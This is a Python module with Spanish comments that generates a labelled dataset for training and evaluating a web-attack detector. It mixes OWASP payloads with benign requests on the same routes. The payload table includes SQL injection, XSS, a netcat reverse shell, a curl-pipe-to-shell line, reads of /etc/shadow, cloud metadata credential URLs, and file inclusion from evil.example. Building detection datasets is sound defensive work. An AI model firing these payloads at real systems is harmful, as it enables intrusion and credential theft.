"""Set adversarial propio: payloads OWASP + tráfico benigno emparejado.

Es nuestro, generado con plantillas y cadenas de ataque que son hechos
técnicos (no obra protegible), así que no depende de fuentes externas ni
infringe derechos. Cubre las categorías OWASP que CSIC/ECML/CRS no traen
(RCE, SSRF, XXE, deserialización, CRLF, SSTI, NoSQLi, buffer overflow,
escalada de privilegios, IDOR) además de las clásicas.

Uso:
    gen = AdversarialGenerator(seed=42)
    df = gen.build(per_category=200)   # DataFrame en el esquema común
    python -m octomatrix.data.adversarial   # -> data/processed/adversarial.parquet

Para que sea un test HONESTO se generan también benignos realistas sobre las
MISMAS rutas y parámetros, para que el modelo no gane por "tiene símbolos raros
= ataque". IDOR y escalada de privilegios se incluyen a sabiendas de que son
poco detectables sólo por el payload: sirven para medir ese límite, no para
inflar el recall.
"""

from __future__ import annotations

import argparse
import random
from pathlib import Path

import pandas as pd

from .schema import NORMAL, HttpSample, to_frame

SOURCE = "adversarial"

PATHS = [
    "/api/users", "/api/products", "/api/orders", "/search", "/login", "/account",
    "/profile", "/admin", "/upload", "/download", "/redirect", "/view", "/items",
    "/cart/checkout", "/comments", "/feed", "/proxy", "/render",
]
PARAMS = ["q", "id", "user", "name", "file", "url", "redirect", "page", "cat", "ref", "data", "template", "doc"]

# --- payloads de ataque (hechos técnicos) ---
ATTACKS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1", "1 UNION SELECT username,password FROM users--", "'; DROP TABLE users;--",
        "1) OR SLEEP(5)--", "admin'--", "1' AND extractvalue(1,concat(0x7e,version()))--",
        "' OR 1=1 LIMIT 1 -- -", "1;WAITFOR DELAY '0:0:5'--",
    ],
    "nosqli": [
        '{"$gt":""}', '{"$ne":null}', "';return(true);var x='", "[$where]=sleep(1000)",
        '{"username":{"$regex":"^adm"}}', "admin'||'1'=='1",
    ],
    "xss": [
        "<script>alert(document.cookie)</script>", "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg/onload=alert(1)>", "<body onload=alert(1)>",
        "'-alert(1)-'", "<iframe src=javascript:alert(1)>",
    ],
    "command_injection": [
        "; cat /etc/passwd", "| whoami", "&& id", "`id`", "$(uname -a)",
        "; nc -e /bin/sh 10.0.0.1 4444", "| ls -la /",
    ],
    "rce": [
        ";python3 -c 'import os;os.system(\"id\")'", "$(curl http://169.254.169.254|sh)",
        "__import__('os').system('id')", "eval(compile('import os','x','exec'))",
        "system('cat /etc/shadow')", "Runtime.getRuntime().exec('id')",
    ],
    "lfi": [
        "../../../../etc/passwd", "....//....//....//etc/shadow", "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php", "..%2f..%2f..%2fetc%2fhosts",
        "/var/log/apache2/access.log%00",
    ],
    "path_traversal": [
        "../../../../windows/win.ini", "..\\..\\..\\boot.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\....\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "rfi": [
        "http://evil.example/shell.txt", "//evil.example/c99.php", "http://evil.example/a.php?",
        "ftp://evil.example/x.txt",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost:6379/", "file:///etc/passwd", "http://[::1]:22", "gopher://127.0.0.1:3306/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE f [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><f>&xxe;</f>",
        "<!DOCTYPE t [<!ENTITY % p SYSTEM \"http://evil.example/e.dtd\"> %p;]>",
    ],
    "deserialization": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", 'O:8:"stdClass":1:{s:4:"exec";s:2:"id";}',
        "\x80\x04\x95\x00cos\nsystem\n", "a:2:{i:0;s:4:\"ls -\";i:1;O:4:\"Evil\":0:{}}",
    ],
    "crlf": [
        "%0d%0aSet-Cookie:admin=1", "%0d%0aLocation:%20http://evil.example",
        "test%0d%0aX-Injected:1", "%E5%98%8A%E5%98%8DSet-Cookie:sessid=hijack",
    ],
    "open_redirect": [
        "//evil.example", "https://evil.example/login", "/\\evil.example", "https:evil.example",
        "http://legit.example.evil.example",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config.items()}}", "${T(java.lang.Runtime).getRuntime()}",
    ],
    "ldap_injection": [
        "*)(uid=*))(|(uid=*", "admin)(&)", "*)(|(password=*))", "*))%00",
    ],
    "xpath_injection": [
        "' or '1'='1", "'] | //user/*[contains(*,'adm')] | a['", "x'or'1'='1",
    ],
    "buffer_overflow": [
        "A" * 2048, "%90" * 400 + "%cc%cc", "%n%n%n%n%n%n%n%n", "\x41" * 1500,
        "1" + "9" * 400, "../" * 600,
    ],
    "privilege_escalation": [
        "role=admin", "isAdmin=true&role=root", "account_type=superuser",
        "?debug=true&god_mode=1", "X-Original-URL=/admin/delete", "privilege=0&uid=0",
    ],
    "idor": [
        "../user/2", "0", "-1", "99999", "1 OR account_id=2", "?account_id=1000&as_user=1001",
    ],
}

# Valores benignos realistas (mismas rutas/params) para el contraste.
BENIGN_VALUES = [
    "laptop", "wireless mouse", "office chair", "john.doe@example.com", "Ada Lovelace",
    "report-2024.pdf", "https://cdn.example.com/img/logo.png", "/dashboard", "2", "electronics",
    "homepage", "order #10492", "size=M&color=blue", "page=3&limit=20", "es-CO",
    "a3f1c9e0-55bd-4e21-9a77-0b2c", "Buenos días, ¿tienen stock?", "price<100&sort=asc",
]
BENIGN_METHODS = ["GET", "GET", "GET", "POST"]


def split_payloads(payloads: list[str], split: str) -> list[str]:
    """Parte los payloads de una categoría en train/holdout por payload.

    Así el experto generado se entrena con unos payloads y se evalúa con OTROS
    de la misma categoría: mide si generaliza a payloads nuevos, no si memoriza.
    "train" toma ~70% (al menos 1); "holdout" el resto; "all" todos.
    Categorías con un solo payload van enteras a train y no aparecen en holdout.
    """
    if split == "all":
        return payloads
    cut = max(1, round(len(payloads) * 0.7))
    return payloads[:cut] if split == "train" else payloads[cut:]


class AdversarialGenerator:
    def __init__(self, seed: int = 42):
        self.rng = random.Random(seed)

    def _emit(self, value: str, attack_type: str, i: int) -> HttpSample:
        rng = self.rng
        path = rng.choice(PATHS)
        param = rng.choice(PARAMS)
        in_body = rng.random() < 0.4
        method = "POST" if in_body else rng.choice(["GET", "GET", "POST"])
        pair = f"{param}={value}"
        query, body = ("", pair) if in_body else (pair, "")
        return HttpSample(
            method=method, path=path, query=query, body=body,
            label=int(attack_type != NORMAL), attack_type=attack_type,
            source=SOURCE, origin_split=self._split, sample_id=f"{attack_type}:{self._split}:{i}",
        )

    def build(self, per_category: int = 200, benign_ratio: float = 1.0, payload_split: str = "all") -> pd.DataFrame:
        """payload_split: 'all' | 'train' | 'holdout' (ver split_payloads)."""
        self._split = payload_split
        samples = []
        for attack_type, payloads in ATTACKS.items():
            pool = split_payloads(payloads, payload_split)
            if not pool:
                continue  # categoría sin payloads en este split
            for i in range(per_category):
                samples.append(self._emit(self.rng.choice(pool), attack_type, i))
        n_benign = int(len(samples) * benign_ratio)
        for i in range(n_benign):
            samples.append(self._emit(self.rng.choice(BENIGN_VALUES), NORMAL, i))
        self.rng.shuffle(samples)
        return to_frame(samples)


def main(argv=None) -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", type=Path, default=Path("data/processed/adversarial.parquet"))
    ap.add_argument("--per-category", type=int, default=200)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args(argv)

    df = AdversarialGenerator(seed=args.seed).build(per_category=args.per_category)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    df.to_parquet(args.out, index=False)
    print(f"{len(df):,} filas ({int(df.label.sum()):,} ataques, {int((df.label == 0).sum()):,} normales)")
    print(f"categorías: {df[df.label == 1].attack_type.nunique()}")
    print(f"-> {args.out}")


if __name__ == "__main__":
    main()
